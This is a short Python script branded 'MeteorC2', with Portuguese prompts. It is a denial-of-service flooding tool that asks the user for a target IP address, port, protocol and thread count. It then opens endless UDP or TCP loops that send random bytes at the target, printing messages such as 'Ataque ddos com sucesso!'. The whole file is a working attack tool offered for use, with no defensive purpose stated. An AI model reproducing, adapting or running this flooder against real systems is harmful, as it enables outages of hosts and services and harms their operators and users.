import signal
import time
import socket
import random
import threading
import sys
import os
import pyfiglet
from os import system, name

print("\033[1;34;40m \n")
os.system("pyfiglet --color=RED MeteorC2")

ip = str(input("  \033[91m Endereço/Ip: \033[0m"))
port = int(input("  \033[91m Porta: \033[0m"))
choice = str(input("  \033[91m Udp (y/n): \033[0m"))
times = int(input(" \033[91m  Time: \033[0m"))
threads = int(input(" \033[91m  Packs: \033[0m"))

def run():
	data = random._urandom(1024)
	i = random.choice(("-->  "))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP = SOCK_DGRAM
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data, addr)
			print(i + "\033[91m Ataque enviado com Sucesso! (UDP)")
		except:
			s.close()
			print(" ")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]", "[!]", "[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #TCP = SOCK_STREAM
			s.connect((ip, port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i + " Ataque ddos com sucesso! (TCP)")
		except:
			s.close()
			print("[*] ERRO 304")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target=run)
		th.start()
	else:
		th = threading.Thread(target=run2)
		th.start()

def clear():
    if name == 'nt':
        _ = system('cls')
    else:
        _ = system('clear')

def byebye():
	clear()
	os.system("figlet TeamTECKED")
	sys.exit(130)

def exit_gracefully(signum, frame):
    signal.signal(signal.SIGINT, original_sigint)
    try:
        exitc = str(input(" sair <3 ?: "))
        if exitc == 'y':
            byebye()
    except KeyboardInterrupt:
        print("Ok ok")
        byebye()

    signal.signal(signal.SIGINT, exit_gracefully)

if __name__ == '__main__':
    original_sigint = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, exit_gracefully)